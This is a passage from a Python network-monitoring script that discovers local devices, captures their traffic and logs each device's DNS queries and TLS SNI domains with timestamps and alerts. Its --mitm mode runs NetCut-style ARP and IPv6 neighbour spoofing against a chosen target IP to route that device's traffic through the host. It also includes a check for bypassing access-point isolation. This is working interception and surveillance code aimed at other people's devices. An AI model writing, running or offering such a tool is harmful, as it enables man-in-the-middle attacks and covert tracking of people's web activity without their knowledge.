    t5.start()

    print(f"  🎯 NetCut-style ARP spoofing started:")
    print(f"     • Target→Gateway (1s interval + initial burst)")
    print(f"     • Gateway→Target (1s interval + initial burst)")
    print(f"     • Broadcast gratuitous ARP (5s interval)")
    print(f"     • IPv6 ND spoofing (3s interval)")
    print(f"     • DHCP monitoring (30s interval)")
    print(f"  📡 Traffic from {target_ip} now flows through this machine")

    # Return stop event and threads for cleanup
    class MITMHandle:
        def __init__(self, stop_event, threads):
            self.stop_event = stop_event
            self.threads = threads

    return MITMHandle(stop_event, [t1, t2, t3, t4, t5]), None

def stop_mitm(handle, _):
    """Stop ARP spoofing and restore network - send correction ARPs"""
    if handle and hasattr(handle, 'stop_event'):
        # Before stopping, send correction ARPs to restore network
        # (NetCut does this to avoid breaking connectivity)
        print(f"  🔄 Sending network restoration ARPs...")
        handle.stop_event.set()
        for t in handle.threads:
            t.join(timeout=2)
        print(f"  🛑 ARP spoofing stopped")

    # Disable IP forwarding
    run_cmd(['sudo', 'sysctl', '-w', 'net.inet.ip.forwarding=0'], timeout=5)
    run_cmd(['sudo', 'sysctl', '-w', 'net.inet6.ip6.forwarding=0'], timeout=5)
    print(f"  🛑 MITM stopped, network restored")

# ============================================================
# ALERT HANDLING
# ============================================================

def alert_worker(state):
    """Process alerts from queue"""
    while state.running:
        try:
            alert = state.alert_queue.get(timeout=1)
            if alert['type'] == 'DOMAIN_ALERT':
                src = alert.get('source', 'SNI')
                print(f"\n  🚨 ALERT [{alert['time']}] via {src}")
                print(f"     Device: {alert['device']} ({alert['ip']})")
                print(f"     Visited: {alert['domain']}")
                print(f"     Matched: {alert['matched']}")
        except queue.Empty:
            continue
        except Exception as e:
            print(f"Alert error: {e}")

# ============================================================
# DASHBOARD
# ============================================================

def print_dashboard(state):
    """Print live dashboard"""
    os.system('clear' if os.name == 'posix' else 'cls')

    print(f"\n{'='*70}")
    print(f"  CONTINUOUS NETWORK MONITOR  |  Cycle: {state.cycle_count}  |  {timestamp()}")
    print(f"  Interface: {state.config['interface']}  |  Subnet: {state.config['subnet']}")
    print(f"{'='*70}")

    # Devices table (Identity-based)
    print(f"\n  {'IDENTITY':<20} {'IP':<15} {'MAC':<17} {'TYPE':<12} {'BYTES':>10} {'PKTS':>6} {'DOMAINS':>6}")
    print(f"  {'-'*90}")

    for mac, info in state.device_map.items():
        name = state.get_identity_name(mac)
        ip = info.get('ip', 'unknown')
        dtype = state.get_identity_type(mac)
        stats = state.traffic_stats.get(mac, {})
        mb = stats.get('bytes', 0) / 1024 / 1024
        pkts = stats.get('packets', 0)
        domains = len(stats.get('domains', set()))
        last = stats.get('last_seen', 'never')

        # Truncate name
        name_short = name[:19]
        print(f"  {name_short:<20} {ip:<15} {mac:<17} {dtype:<12} {mb:>10.2f} {pkts:>6} {domains:>6}  [{last}]")

    # Show merged identities
    if state.device_identities:
        print(f"\n  {'MERGED IDENTITIES (across MAC/IP changes)'}")
        print(f"  {'-'*90}")
        for identity_id, identity in state.device_identities.items():
            if len(identity['macs']) > 1 or len(identity['ips']) > 1:
                macs = ', '.join(sorted(identity['macs']))
                ips = ', '.join(sorted(identity['ips']))
                print(f"  {identity['name'][:18]:<18} [{identity['type']}] MACs: {macs} | IPs: {ips}")

    # Recent domains per device (with timeline)
    print(f"\n  {'RECENT ACTIVITY (Domains with Time)'}")
    print(f"  {'-'*90}")
    for mac, stats in state.traffic_stats.items():
        if stats.get('domain_timeline'):
            name = state.get_identity_name(mac)
            recent = stats['domain_timeline'][-10:]
            for time_str, domain, source in recent:
                source_marker = '🔒' if source == 'SNI' else '🌐'
                print(f"  {name[:18]:<18} [{time_str}] {source_marker} {domain}")

    # DNS queries with timeline
    print(f"\n  {'RECENT DNS QUERIES (with Time)'}")
    print(f"  {'-'*70}")
    for mac, stats in state.traffic_stats.items():
        if stats.get('dns_timeline'):
            name = state.get_identity_name(mac)
            recent = stats['dns_timeline'][-8:]
            for time_str, domain in recent:
                print(f"  {name[:18]:<18} [{time_str}] 🌐 {domain}")

    # Alerts
    print(f"\n  {'ALERTS'}")
    print(f"  {'-'*70}")
    alerts_shown = 0
    while not state.alert_queue.empty() and alerts_shown < 5:
        try:
            alert = state.alert_queue.get_nowait()
            src = alert.get('source', 'SNI')
            mac = alert.get('mac', 'unknown')
            print(f"  🚨 [{src}] {alert['time']}  {alert['device']} ({mac}) → {alert['domain']}  (matched: {alert['matched']})")
            alerts_shown += 1
        except queue.Empty:
            break

    if alerts_shown == 0:
        print(f"  No alerts this cycle")

    print(f"\n  Press Ctrl+C to stop | Next discovery in ~{state.config['discovery_interval']}s")

# ============================================================
# MAIN MONITOR LOOP
# ============================================================

def signal_handler(sig, frame):
    print("\n\nShutting down...")
    state.running = False

def main_loop(config):
    global state
    state = MonitorState(config)

    # Start alert worker thread
    alert_thread = threading.Thread(target=alert_worker, args=(state,), daemon=True)
    alert_thread.start()

    print_banner("CONTINUOUS NETWORK MONITOR STARTED")
    print(f"  Interface: {config['interface']}")
    print(f"  Subnet: {config['subnet']}")
    print(f"  Discovery interval: {config['discovery_interval']}s")
    print(f"  Capture interval: {config['capture_interval']}s")
    print(f"  Alert domains: {len(config['alert_domains'])} configured")
    print(f"  Known devices: {len(config['known_devices'])}")

    # Start MITM if enabled
    mitm_handle = None
    if config.get('mitm_enabled'):
        mitm_handle, _ = start_mitm(config)
        if not mitm_handle:
            print("  ❌ MITM failed to start, continuing without MITM...")
            config['mitm_enabled'] = False

    print(f"\n  Press Ctrl+C to stop\n")

    # Initial discovery
    discover_network(state)

    # Start background quick discovery thread (fast ARP scans for new devices)
    quick_interval = config.get('quick_discovery_interval', 10)
    def quick_discovery_worker(state):
        """Background thread: quick ARP scans to detect new devices"""
        while state.running:
            time.sleep(quick_interval)
            if not state.running:
                break
            # Quick ARP scan only
            stdout, _, _ = run_cmd([
                'sudo', 'arp-scan', '--localnet',
                '--interface', state.config['interface'],
                '--quiet'
            ], timeout=10)

            for line in stdout.strip().split('\n'):
                if line and line[0].isdigit():
                    parts = line.split()
                    if len(parts) >= 2:
                        ip, mac = parts[0], parts[1]
                        if 'packets' in line.lower() or 'received' in line.lower():
                            continue
                        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
                            continue
                        if not re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', mac):
                            continue
                        # Check if new device
                        is_new = state.update_device(ip, mac=mac)
                        if is_new:
                            print(f"\n  📱 NEW DEVICE: {ip} ({mac}) - Fingerprinting...")
                            fingerprint_device(ip, state, mac)
                            print(f"     → {state.get_identity_name(ip)} [{state.get_identity_type(ip)}]")

    quick_thread = threading.Thread(target=quick_discovery_worker, args=(state,), daemon=True)
    quick_thread.start()
    print(f"  Background quick discovery: every {quick_interval}s")

    try:
        while state.running:
            state.cycle_count += 1

            # Phase 1: Discovery (every N cycles or first cycle)
            if state.cycle_count == 1 or state.cycle_count % max(1, config['discovery_interval'] // config['capture_interval']) == 0:
                discover_network(state)

            # Phase 2: Capture & Attribution
            print_section(f"CAPTURE CYCLE #{state.cycle_count} - {timestamp()}")
            print(f"  Capturing for {config['capture_interval']}s...")

            pcap_file = capture_traffic(state)
            print(f"  Analyzing capture...")

            sni_results = analyze_capture(pcap_file, state)

            # Print dashboard
            print_dashboard(state)

            # Print SNI results for this cycle
            if sni_results:
                print(f"\n  TLS SNI this cycle:")
                for device, domains in sni_results.items():
                    for d in domains:
                        alert_str = " 🚨" if any(ad in d for ad in config['alert_domains']) else ""
                        print(f"    {device}: {d}{alert_str}")

            # Also print DNS alerts if any were triggered this cycle
            # (DNS alerts are handled in alert_worker, but we can show recent DNS queries)

            # Wait for next cycle
            if state.running:
                time.sleep(2)  # Brief pause between cycles

    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
    finally:
        state.running = False
        # Stop MITM if running
        if config.get('mitm_enabled') and mitm_handle:
            stop_mitm(mitm_handle, None)
        print_final_summary(state)

def print_final_summary(state):
    print_banner("FINAL SUMMARY")
    print(f"  Total cycles: {state.cycle_count}")
    print(f"  Devices monitored: {len(state.device_map)}")
    print(f"\n  Traffic Summary:")
    for name, stats in sorted(state.traffic_stats.items(), key=lambda x: x[1].get('bytes', 0), reverse=True):
        mb = stats.get('bytes', 0) / 1024 / 1024
        pkts = stats.get('packets', 0)
        domains = len(stats.get('domains', set()))
        dns = len(stats.get('dns_queries', set()))
        if mb > 0.01 or pkts > 0:
            print(f"    {name:<20}: {mb:>8.2f} MB  {pkts:>6} pkts  {domains} domains  {dns} DNS")

# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Continuous Network Monitor - Discovery + Attribution')
    parser.add_argument('-i', '--interface', default='en0', help='Network interface (default: en0)')
    parser.add_argument('-s', '--subnet', default='192.168.0.0/24', help='Subnet to monitor')
    parser.add_argument('-d', '--discovery-interval', type=int, default=30, help='Seconds between full discovery scans')
    parser.add_argument('-c', '--capture-interval', type=int, default=30, help='Seconds of capture per cycle')
    parser.add_argument('-q', '--quick-discovery', type=int, default=10, help='Seconds between quick ARP scans for new devices')
    parser.add_argument('--alert-domains', help='Comma-separated domains to alert on')
    parser.add_argument('--list-devices', action='store_true', help='List known devices and exit')
    parser.add_argument('--web', action='store_true', help='Enable web dashboard (Flask) on port 5000')
    # MITM/ARP Spoofing arguments
    parser.add_argument('--mitm', metavar='TARGET_IP', help='Enable MITM mode: target IP to monitor (e.g., 192.168.0.101)')
    parser.add_argument('--mitm-gateway', metavar='GATEWAY_IP', help='Gateway IP for MITM (auto-detected if not specified)')
    parser.add_argument('--test-ap-isolation', metavar='TARGET_IP', help='Test if AP isolation blocks ARP to target IP and exit')

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Error: This script requires root privileges (sudo)")
        sys.exit(1)

    config = DEFAULT_CONFIG.copy()
    config['interface'] = args.interface
    config['subnet'] = args.subnet
    config['discovery_interval'] = args.discovery_interval
    config['capture_interval'] = args.capture_interval
    config['quick_discovery_interval'] = args.quick_discovery
    config['enable_web_dashboard'] = args.web
    # MITM settings
    config['mitm_enabled'] = args.mitm is not None
    config['mitm_target_ip'] = args.mitm
    config['mitm_gateway_ip'] = args.mitm_gateway

    if args.alert_domains:
        config['alert_domains'] = [d.strip() for d in args.alert_domains.split(',')]

    if args.list_devices:
        print("Known devices:")
        for ip, info in config['known_devices'].items():
            print(f"  {ip:15}  {info['mac']:17}  {info['name']}  [{info['type']}]")
        sys.exit(0)

    # Test AP isolation if requested
    if args.test_ap_isolation:
        try:
            from scapy.all import ARP, Ether, srp, conf
        except ImportError:
            print("Error: scapy not found. Install with: pip3 install scapy --break-system-packages")
            sys.exit(1)
        isolated, mac = test_ap_isolation(args.test_ap_isolation, args.interface)
        sys.exit(0)

    # Check dependencies
    required_cmds = ['arp-scan', 'nmap', 'tcpdump', 'tshark']
    if config.get('mitm_enabled'):
        # Check for scapy Python module
        try:
            import scapy
        except ImportError:
            print("Error: scapy not found. Install with: pip3 install scapy --break-system-packages")
            sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    main_loop(config)